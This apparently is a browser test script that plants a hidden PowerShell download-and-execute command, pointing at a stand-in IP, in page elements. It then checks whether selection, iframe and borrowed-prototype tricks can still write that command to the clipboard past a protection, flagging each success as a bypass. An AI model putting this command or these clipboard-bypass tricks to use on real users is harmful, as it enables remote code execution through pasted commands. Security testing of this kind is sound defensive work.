import { start } from "./harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const esc = CMD.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;");
const page0 = `<!doctype html><style>#gen::before{content:${JSON.stringify(CMD)}}</style><body><button id=b>go</button>
<div id=g1>x <img alt="${esc}" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="> y</div>
<div id=g2>x <span id=gen></span> y</div>
<div id=g3>x <textarea>${esc}</textarea> y</div>
<div id=g4>x <input value="${esc}"> y</div>
<div id=g5>x <svg><text>${esc}</text></svg> y</div>
<script>window.CMD=${JSON.stringify(CMD)};</script>`;
const { ctx, base, close } = await start({ "/": page0 });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(300);
async function attempt(name, fn) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await page.waitForTimeout(500);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(46), got.includes("powershell") ? "COMMAND WRITTEN (bypass): " + JSON.stringify(got).slice(0,90) : "no command: " + JSON.stringify(got).slice(0, 50));
}
for (const id of ["g1","g2","g3","g4","g5"]) {
  await attempt("G range copy " + id, `() => { const s=getSelection(); s.removeAllRanges(); const r=document.createRange(); r.selectNodeContents(document.getElementById('${id}')); s.addRange(r); console.log('${id} toString', JSON.stringify(s.toString().slice(0,30)), 'exec', document.execCommand('copy')); }`);
}
await attempt("H fresh about:blank frame writeText", `() => { const f=document.createElement('iframe'); document.body.appendChild(f); f.contentWindow.navigator.clipboard.writeText(CMD).then(()=>console.log('H ok'),e=>console.log('H rej',e.name)); }`);
await attempt("I fresh about:blank frame execCommand", `() => { const f=document.createElement('iframe'); document.body.appendChild(f); const d=f.contentDocument; d.body.textContent=CMD; d.getSelection().selectAllChildren(d.body); console.log('I exec', d.execCommand('copy')); }`);
await attempt("J native from frame, applied on top", `() => { const f=document.createElement('iframe'); document.body.appendChild(f); const w=f.contentWindow.Clipboard.prototype.writeText; f.remove(); w.call(navigator.clipboard, CMD).then(()=>console.log('J ok'),e=>console.log('J rej',e.name)); }`);
await close();
